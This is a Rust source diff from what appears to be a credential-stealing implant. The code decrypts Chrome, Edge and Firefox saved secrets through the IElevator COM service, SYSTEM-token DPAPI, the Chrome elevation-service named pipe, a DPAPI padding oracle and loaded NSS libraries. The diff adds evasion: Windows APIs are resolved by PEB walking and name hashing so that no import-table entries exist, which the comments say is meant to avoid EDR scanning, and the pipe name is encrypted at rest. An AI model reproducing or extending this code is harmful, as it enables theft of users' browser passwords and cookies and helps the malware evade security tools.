@@ -25,12 +25,85 @@ use base64::Engine as _;
 use serde::{Deserialize, Serialize};
 
 use winapi::shared::guiddef::GUID;
-use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoUninitialize};
-// CloseHandle removed — using NtClose indirect syscall instead
-use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};
-use winapi::um::oleauto::{SysAllocStringByteLen, SysFreeString};
-use winapi::um::winbase::LocalFree;
+use winapi::shared::minwindef::{DWORD, HMODULE};
 use winapi::um::winnt::HANDLE;
+
+// ── Dynamic API resolution — no IAT entries ──────────────────────────────────
+//
+// All Win32 API functions are resolved at runtime via PEB walking and PE
+// export-table hashing (pe_resolve).  This avoids creating IAT entries that
+// EDR products scan for.
+
+type FnCryptUnprotectData = unsafe extern "system" fn(
+    *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+    *mut *mut u16,
+    *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+    *mut c_void,
+    *mut c_void,
+    u32,
+    *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+) -> i32;
+
+type FnCoCreateInstance = unsafe extern "system" fn(
+    *const GUID, *mut c_void, DWORD, *const GUID, *mut *mut c_void,
+) -> i32;
+
+type FnCoInitializeEx = unsafe extern "system" fn(*mut c_void, DWORD) -> i32;
+type FnCoUninitialize = unsafe extern "system" fn();
+type FnSysAllocStringByteLen = unsafe extern "system" fn(*const i8, u32) -> *mut u16;
+type FnSysFreeString = unsafe extern "system" fn(*mut u16);
+type FnLocalFree = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> HMODULE;
+type FnFreeLibrary = unsafe extern "system" fn(HMODULE) -> i32;
+type FnGetProcAddress = unsafe extern "system" fn(HMODULE, *const i8) -> *mut c_void;
+type FnWaitNamedPipeW = unsafe extern "system" fn(*const u16, DWORD) -> i32;
+type FnCreateFileW = unsafe extern "system" fn(
+    *const u16, DWORD, DWORD, *mut c_void, DWORD, DWORD, *mut c_void,
+) -> HANDLE;
+type FnWriteFile = unsafe extern "system" fn(
+    HANDLE, *const c_void, DWORD, *mut DWORD, *mut c_void,
+) -> i32;
+type FnReadFile = unsafe extern "system" fn(
+    HANDLE, *mut c_void, DWORD, *mut DWORD, *mut c_void,
+) -> i32;
+
+/// Resolve a function pointer by DLL hash and function-name hash.
+#[inline(always)]
+unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
+    let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+    Some(std::mem::transmute::<_, T>(fn_addr))
+}
+
+/// Resolve a function from a DLL that may not be in the PEB yet.
+/// First tries PEB lookup; if that fails, loads the DLL via kernel32's
+/// LoadLibraryW, then resolves the function.
+#[inline(always)]
+unsafe fn resolve_api_or_load<T>(
+    dll_wide: &[u16],
+    dll_hash: u32,
+    fn_hash: u32,
+) -> Option<T> {
+    // Try PEB first.
+    if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
+        if let Some(addr) = pe_resolve::get_proc_address_by_hash(base, fn_hash) {
+            return Some(std::mem::transmute::<_, T>(addr));
+        }
+    }
+    // DLL not loaded yet — use LoadLibraryW from kernel32.
+    let load_library_w: FnLoadLibraryW = {
+        let base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            base,
+            pe_resolve::hash_str(b"LoadLibraryW\0"),
+        )?;
+        std::mem::transmute::<_, FnLoadLibraryW>(addr)
+    };
+    let _hmod = load_library_w(dll_wide.as_ptr());
+    let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+    Some(std::mem::transmute::<_, T>(fn_addr))
+}
 use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ};
 use winreg::RegKey;
 
@@ -448,8 +521,10 @@ fn sqlite_read_table(db: &[u8], table_name: &str) -> Result<Vec<Vec<SqliteValue>
 /// Callers needing SYSTEM-context decryption should first call
 /// `token_manipulation::get_system()` and revert after.
 fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>> {
-    use winapi::um::dpapi::CryptUnprotectData;
     use winapi::um::wincrypt::CRYPT_INTEGER_BLOB;
+
+    let crypt_unprotect = unsafe { resolve_crypt_unprotect_data() }
+        .ok_or_else(|| anyhow!("CryptUnprotectData resolve failed"))?;
 
     let mut in_blob = CRYPT_INTEGER_BLOB {
         cbData: data.len() as u32,
@@ -458,7 +533,7 @@ fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>> {
     let mut out_blob: CRYPT_INTEGER_BLOB = unsafe { std::mem::zeroed() };
 
     let ok = unsafe {
-        CryptUnprotectData(
+        crypt_unprotect(
             &mut in_blob,
             ptr::null_mut(), // ppszDataDescr
             ptr::null_mut(), // pOptionalEntropy
@@ -476,7 +551,12 @@ fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>> {
     let decrypted = unsafe {
         std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec()
     };
-    unsafe { LocalFree(out_blob.pbData as *mut _) };
+
+    // Free via dynamically resolved LocalFree.
+    let local_free: FnLocalFree = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LocalFree\0"))
+    }.ok_or_else(|| anyhow!("LocalFree resolve failed"))?;
+    unsafe { local_free(out_blob.pbData as *mut _) };
     Ok(decrypted)
 }
 
@@ -604,8 +684,31 @@ unsafe fn com_try_decrypt(
     iid: &GUID,
     data: &[u8],
 ) -> Result<Vec<u8>> {
+    // Resolve ole32.dll functions (may not be in PEB — load if needed).
+    let ole32_wide: Vec<u16> = "ole32.dll\0".encode_utf16().collect();
+    let ole32_hash = pe_resolve::hash_wstr(&ole32_wide[..ole32_wide.len() - 1]);
+    let co_create: FnCoCreateInstance = resolve_api_or_load(
+        &ole32_wide,
+        ole32_hash,
+        pe_resolve::hash_str(b"CoCreateInstance\0"),
+    ).ok_or_else(|| anyhow!("CoCreateInstance resolve failed"))?;
+
+    // Resolve oleaut32.dll functions.
+    let oleaut32_wide: Vec<u16> = "oleaut32.dll\0".encode_utf16().collect();
+    let oleaut32_hash = pe_resolve::hash_wstr(&oleaut32_wide[..oleaut32_wide.len() - 1]);
+    let sys_alloc: FnSysAllocStringByteLen = resolve_api_or_load(
+        &oleaut32_wide,
+        oleaut32_hash,
+        pe_resolve::hash_str(b"SysAllocStringByteLen\0"),
+    ).ok_or_else(|| anyhow!("SysAllocStringByteLen resolve failed"))?;
+    let sys_free: FnSysFreeString = resolve_api_or_load(
+        &oleaut32_wide,
+        oleaut32_hash,
+        pe_resolve::hash_str(b"SysFreeString\0"),
+    ).ok_or_else(|| anyhow!("SysFreeString resolve failed"))?;
+
     let mut punk: *mut c_void = ptr::null_mut();
-    let hr = CoCreateInstance(
+    let hr = co_create(
         clsid as *const GUID,
         ptr::null_mut(),
         4u32, // CLSCTX_LOCAL_SERVER
@@ -633,7 +736,7 @@ unsafe fn com_try_decrypt(
     let _guard = ComRelease(punk);
 
     // Create a byte-oriented BSTR for the encrypted data.
-    let bstr_in = SysAllocStringByteLen(data.as_ptr() as *const i8, data.len() as u32);
+    let bstr_in = sys_alloc(data.as_ptr() as *const i8, data.len() as u32);
     if bstr_in.is_null() {
         bail!("SysAllocStringByteLen failed");
     }
@@ -657,29 +760,53 @@ unsafe fn com_try_decrypt(
         let hr = decrypt_fn(punk, bstr_in, &mut bstr_out, &mut last_error);
 
         if hr == 0 && !bstr_out.is_null() {
-            // Read byte count from the 4 bytes before the BSTR pointer.
-            let byte_len = *(bstr_out as *const u32).sub(1) as usize;
+            // BSTR stores length in the 4 bytes immediately before the data pointer.
+            // This is guaranteed by the BSTR allocation contract (SysAllocStringByteLen).
+            let byte_len = unsafe { *(((bstr_out as *const u8).sub(4)) as *const u32) } as usize;
+            if byte_len > 1024 * 1024 {
+                sys_free(bstr_out);
+                sys_free(bstr_in);
+                bail!("implausible BSTR length {}", byte_len);
+            }
             let result = std::slice::from_raw_parts(bstr_out as *const u8, byte_len).to_vec();
-            SysFreeString(bstr_out);
-            SysFreeString(bstr_in);
+            sys_free(bstr_out);
+            sys_free(bstr_in);
             return Ok(result);
         }
 
         if !bstr_out.is_null() {
-            SysFreeString(bstr_out);
+            sys_free(bstr_out);
             bstr_out = ptr::null_mut();
         }
         // HRESULT with high bit set means a genuine error.  Try next slot.
     }
 
-    SysFreeString(bstr_in);
+    sys_free(bstr_in);
     bail!("IElevator::DecryptData failed on all tried vtable slots");
 }
 
 /// Strategy A: decrypt via the Chrome/Edge IElevator COM elevation service.
 fn decrypt_master_key_via_com(encrypted_key: &[u8], clsids: &[GUID]) -> Result<Vec<u8>> {
+    // Resolve ole32.dll CoInitializeEx / CoUninitialize.
+    let ole32_wide: Vec<u16> = "ole32.dll\0".encode_utf16().collect();
+    let ole32_hash = pe_resolve::hash_wstr(&ole32_wide[..ole32_wide.len() - 1]);
+    let co_init: FnCoInitializeEx = unsafe {
+        resolve_api_or_load(
+            &ole32_wide,
+            ole32_hash,
+            pe_resolve::hash_str(b"CoInitializeEx\0"),
+        )
+    }.ok_or_else(|| anyhow!("CoInitializeEx resolve failed"))?;
+    let co_uninit: FnCoUninitialize = unsafe {
+        resolve_api_or_load(
+            &ole32_wide,
+            ole32_hash,
+            pe_resolve::hash_str(b"CoUninitialize\0"),
+        )
+    }.ok_or_else(|| anyhow!("CoUninitialize resolve failed"))?;
+
     // CoInitializeEx for the calling thread; tolerate S_FALSE (already initialized).
-    let hr_init = unsafe { CoInitializeEx(ptr::null_mut(), 0x2 /* COINIT_APARTMENTTHREADED */) };
+    let hr_init = unsafe { co_init(ptr::null_mut(), 0x2 /* COINIT_APARTMENTTHREADED */) };
     let did_coinit = hr_init == 0;
 
     let mut last_err: Option<anyhow::Error> = None;
@@ -687,7 +814,7 @@ fn decrypt_master_key_via_com(encrypted_key: &[u8], clsids: &[GUID]) -> Result<V
         match unsafe { com_try_decrypt(clsid, &IID_IELEVATOR, encrypted_key) } {
             Ok(key) => {
                 if did_coinit {
-                    unsafe { CoUninitialize() };
+                    unsafe { co_uninit() };
                 }
                 return Ok(key);
             }
@@ -696,7 +823,7 @@ fn decrypt_master_key_via_com(encrypted_key: &[u8], clsids: &[GUID]) -> Result<V
     }
 
     if did_coinit {
-        unsafe { CoUninitialize() };
+        unsafe { co_uninit() };
     }
     Err(last_err.unwrap_or_else(|| anyhow!("no CLSIDs to try")))
 }
@@ -718,25 +845,45 @@ fn decrypt_master_key_via_system_token(encrypted_key: &[u8]) -> Result<Vec<u8>> 
 /// Strategy C: send the encrypted key to the Chrome elevation service via its
 /// named pipe and return the decrypted bytes.
 ///
-/// The pipe name is `\\.\pipe\ChromeElevationService`; the wire format is a
-/// simple length-prefixed binary frame.
+/// The pipe name is encrypted at rest; the wire format is a simple
+/// length-prefixed binary frame.
 fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
-    use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING, ReadFile, WriteFile};
-    use winapi::um::namedpipeapi::WaitNamedPipeW;
-    use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE, FILE_ATTRIBUTE_NORMAL};
-    use winapi::shared::minwindef::DWORD;
+    // Resolve kernel32 functions for pipe IPC.
+    let wait_named_pipe: FnWaitNamedPipeW = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"WaitNamedPipeW\0"))
+    }.ok_or_else(|| anyhow!("WaitNamedPipeW resolve failed"))?;
+    let create_file: FnCreateFileW = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"CreateFileW\0"))
+    }.ok_or_else(|| anyhow!("CreateFileW resolve failed"))?;
+    let write_file: FnWriteFile = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"WriteFile\0"))
+    }.ok_or_else(|| anyhow!("WriteFile resolve failed"))?;
+    let read_file: FnReadFile = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"ReadFile\0"))
+    }.ok_or_else(|| anyhow!("ReadFile resolve failed"))?;
 
-    const PIPE_NAME: &str = r"\\.\pipe\ChromeElevationService";
-    let pipe_wide: Vec<u16> = PIPE_NAME.encode_utf16().chain(std::iter::once(0)).collect();
+    let pipe_wide: Vec<u16> = String::from_utf8_lossy(
+        &string_crypt::enc_str!("\\\\.\\pipe\\ChromeElevationService\0"),
+    )
+    .trim_end_matches('\0')
+    .encode_utf16()
+    .chain(std::iter::once(0))
+    .collect();
+
+    const GENERIC_READ: DWORD = 0x80000000;
+    const GENERIC_WRITE: DWORD = 0x40000000;
+    const OPEN_EXISTING: DWORD = 3;
+    const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;
+    const INVALID_HANDLE_VALUE: *mut c_void = !0 as *mut c_void;
 
     // Wait up to 3 s for the pipe to be available.
-    let wait_ok = unsafe { WaitNamedPipeW(pipe_wide.as_ptr(), 3000) };
+    let wait_ok = unsafe { wait_named_pipe(pipe_wide.as_ptr(), 3000) };
     if wait_ok == 0 {
         bail!("WaitNamedPipeW: Chrome elevation service pipe not available");
     }
 
     let pipe = unsafe {
-        CreateFileW(
+        create_file(
             pipe_wide.as_ptr(),
             GENERIC_READ | GENERIC_WRITE,
             0,
@@ -746,7 +893,7 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
             ptr::null_mut(),
         )
     };
-    if pipe == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+    if pipe == INVALID_HANDLE_VALUE {
         bail!("CreateFileW: could not open elevation service pipe");
     }
 
@@ -767,7 +914,7 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
 
     let mut written: u32 = 0;
     let ok = unsafe {
-        WriteFile(pipe, frame.as_ptr() as *const c_void, frame.len() as u32, &mut written, ptr::null_mut())
+        write_file(pipe, frame.as_ptr() as *const c_void, frame.len() as u32, &mut written, ptr::null_mut())
     };
     if ok == 0 {
         bail!("WriteFile to elevation service pipe failed");
@@ -777,7 +924,7 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
     let mut len_buf = [0u8; 4];
     let mut read: u32 = 0;
     let ok = unsafe {
-        ReadFile(pipe, len_buf.as_mut_ptr() as *mut c_void, 4, &mut read, ptr::null_mut())
+        read_file(pipe, len_buf.as_mut_ptr() as *mut c_void, 4, &mut read, ptr::null_mut())
     };
     if ok == 0 || read != 4 {
         bail!("ReadFile (length prefix) from elevation service pipe failed");
@@ -789,7 +936,7 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
 
     let mut response = vec![0u8; response_len];
     let ok = unsafe {
-        ReadFile(pipe, response.as_mut_ptr() as *mut c_void, response_len as u32, &mut read, ptr::null_mut())
+        read_file(pipe, response.as_mut_ptr() as *mut c_void, response_len as u32, &mut read, ptr::null_mut())
     };
     if ok == 0 || read as usize != response_len {
         bail!("ReadFile (payload) from elevation service pipe failed");
@@ -966,8 +1113,15 @@ unsafe fn dpapi_oracle(
     );
 
     if ok != 0 && !out_blob.pbData.is_null() {
-        // Success — valid padding.  Free the output buffer.
-        LocalFree(out_blob.pbData as *mut _);
+        // Success — valid padding.  Free the output buffer via resolved LocalFree.
+        if let Some(local_free) = unsafe {
+            resolve_api::<FnLocalFree>(
+                pe_resolve::HASH_KERNEL32_DLL,
+                pe_resolve::hash_str(b"LocalFree\0"),
+            )
+        } {
+            unsafe { local_free(out_blob.pbData as *mut _) };
+        }
         true
     } else {
         false
@@ -1739,9 +1893,23 @@ fn find_firefox_install_dir() -> Option<PathBuf> {
 }
 
 /// Load mozglue.dll and nss3.dll from `install_dir` and resolve function
-/// pointers.  The caller must call `FreeLibrary` on both returned handles when
-/// done.
-unsafe fn load_nss(install_dir: &Path) -> Result<(*mut c_void, *mut c_void, NssFunctions)> {
+/// pointers.  The caller must call the resolved `FreeLibrary` on both
+/// returned handles when done.
+unsafe fn load_nss(install_dir: &Path) -> Result<(HMODULE, HMODULE, NssFunctions)> {
+    // Resolve kernel32 functions for DLL loading.
+    let load_library_a: FnLoadLibraryA = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"LoadLibraryA\0"),
+    ).ok_or_else(|| anyhow!("LoadLibraryA resolve failed"))?;
+    let free_library: FnFreeLibrary = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"FreeLibrary\0"),
+    ).ok_or_else(|| anyhow!("FreeLibrary resolve failed"))?;
+    let get_proc_address: FnGetProcAddress = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"GetProcAddress\0"),
+    ).ok_or_else(|| anyhow!("GetProcAddress resolve failed"))?;
+
     let mozglue_path = install_dir.join("mozglue.dll");
     let nss3_path = install_dir.join("nss3.dll");
 
@@ -1751,22 +1919,22 @@ unsafe fn load_nss(install_dir: &Path) -> Result<(*mut c_void, *mut c_void, NssF
         .context("CString nss3 path")?;
 
     // mozglue must be loaded first.
-    let h_mozglue = LoadLibraryA(mozglue_cstr.as_ptr());
+    let h_mozglue = load_library_a(mozglue_cstr.as_ptr());
     if h_mozglue.is_null() {
         bail!("LoadLibraryA(mozglue.dll) failed");
     }
-    let h_nss3 = LoadLibraryA(nss3_cstr.as_ptr());
+    let h_nss3 = load_library_a(nss3_cstr.as_ptr());
     if h_nss3.is_null() {
-        FreeLibrary(h_mozglue);
+        free_library(h_mozglue);
         bail!("LoadLibraryA(nss3.dll) failed");
     }
 
     macro_rules! resolve {
         ($hmod:expr, $name:literal, $ty:ty) => {{
-            let sym = GetProcAddress($hmod, concat!($name, "\0").as_ptr() as *const i8);
+            let sym = get_proc_address($hmod, concat!($name, "\0").as_ptr() as *const i8);
             if sym.is_null() {
-                FreeLibrary(h_nss3);
-                FreeLibrary(h_mozglue);
+                free_library(h_nss3);
+                free_library(h_mozglue);
                 bail!("GetProcAddress({}) failed", $name);
             }
             std::mem::transmute::<*mut c_void, $ty>(sym)
@@ -1791,7 +1959,7 @@ unsafe fn load_nss(install_dir: &Path) -> Result<(*mut c_void, *mut c_void, NssF
         secitem_free_item:          resolve!(h_nss3, "SECITEM_FreeItem",           SecitemFreeItemFn),
     };
 
-    Ok((h_mozglue as *mut c_void, h_nss3 as *mut c_void, fns))
+    Ok((h_mozglue, h_nss3, fns))
 }
 
 /// Decrypt a single base64-encoded NSS-encrypted value using `PK11SDR_Decrypt`.
@@ -2069,10 +2237,15 @@ pub fn collect_firefox_data(data_type: &common::BrowserDataType) -> BrowserDataR
         unsafe { (fns.nss_shutdown)() };
     }
 
-    // Unload DLLs — nss3 first, then mozglue.
+    // Unload DLLs — nss3 first, then mozglue — via dynamically resolved FreeLibrary.
     unsafe {
-        FreeLibrary(h_nss3 as *mut _);
-        FreeLibrary(h_mozglue as *mut _);
+        if let Some(free_lib) = resolve_api::<FnFreeLibrary>(
+            pe_resolve::HASH_KERNEL32_DLL,
+            pe_resolve::hash_str(b"FreeLibrary\0"),
+        ) {
+            free_lib(h_nss3);
+            free_lib(h_mozglue);
+        }
     }
 
     result
